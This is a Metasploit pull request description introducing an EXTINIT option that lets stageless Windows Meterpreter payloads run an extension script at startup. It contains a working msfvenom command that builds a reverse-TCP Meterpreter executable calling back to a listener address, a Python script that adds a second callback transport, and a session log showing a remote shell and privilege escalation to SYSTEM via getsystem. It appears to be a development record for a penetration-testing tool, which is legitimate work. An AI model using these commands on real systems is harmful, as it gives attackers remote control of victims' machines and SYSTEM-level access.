Source: @oj via https://github.com/rapid7/metasploit-framework/pull/6264

Stageless extensions can now receive a parameter on startup that lets them do something prior to Meterpreter connecting back to MSF. At the moment, the python extension is the only one that supports this.

A new parameter has been added to the windows stageless payloads, this is called EXTINIT and contains the "extension initialisation" information. Below shows a sample command line that wires in a script for the python extension to run on startup:

```
./msfvenom -p ... LHOST=... EXTENSIONS=python EXTINIT=python,/path/to/script.py ...
The EXTINIT parameter is in the format: ext1_name,path_to_file:ext2_name,path_to_file:...
```

Extensions, in future, may also require such ability to initialise, which is why this is intended to be a little generic.

Note, this feature does not currently verify that the extension name given is included in the list of extensions that have been wired into the binary.

Sample Run

Script content:
```
$ cat /Users/oj/test.py
import meterpreter.transport
meterpreter.transport.add("tcp://127.0.0.1:8000")
Binary creation:

$ ./msfvenom -p windows/x64/meterpreter_reverse_tcp LPORT=6005 LHOST=172.16.52.1 EXTENSIONS=stdapi,priv,python EXTINIT=python,/Users/oj/test.py -f exe -o ~/scratch/a-meterp64.exe
No platform was selected, choosing Msf::Module::Platform::Windows from the payload
No Arch selected, selecting Arch: x64 from the payload
WARNING: Local file /Users/oj/code/metasploit-framework/data/meterpreter/metsrv.x64.dll is being used
WARNING: Local files may be incompatible Metasploit framework
WARNING: Local file /Users/oj/code/metasploit-framework/data/meterpreter/ext_server_stdapi.x64.dll is being used
WARNING: Local file /Users/oj/code/metasploit-framework/data/meterpreter/ext_server_priv.x64.dll is being used
WARNING: Local file /Users/oj/code/metasploit-framework/data/meterpreter/ext_server_python.x64.dll is being used
No encoder or badchars specified, outputting raw payload
Payload size: 7485589 bytes
Saved as: /Users/oj/scratch/a-meterp64.exe
Shell creation, validation that the script ran, and a random call to bindings to make sure the old stuff still works:

msf exploit(handler) > [*] Meterpreter session 5 opened (172.16.52.1:6005 -> 172.16.52.167:49161) at 2015-11-20 13:02:18 +1000
sessions -i -1
[*] Starting interaction with 5...

meterpreter > transport list
Session Expiry  : @ 2015-11-27 13:02:14

    ID  Curr  URL                     Comms T/O  Retry Total  Retry Wait
    --  ----  ---                     ---------  -----------  ----------
    1         tcp://127.0.0.1:8000    300        3600         10
    2   *     tcp://172.16.52.1:6005  300        3600         10

meterpreter > python_execute "import meterpreter.elevate,meterpreter.user;meterpreter.elevate.getsystem();print meterpreter.user.getuid();meterpreter.elevate.rev2self();print meterpreter.user.getuid()"
[+] Content written to stdout:
NT AUTHORITY\SYSTEM
WIN-TV01I7GG7JK\oj
```
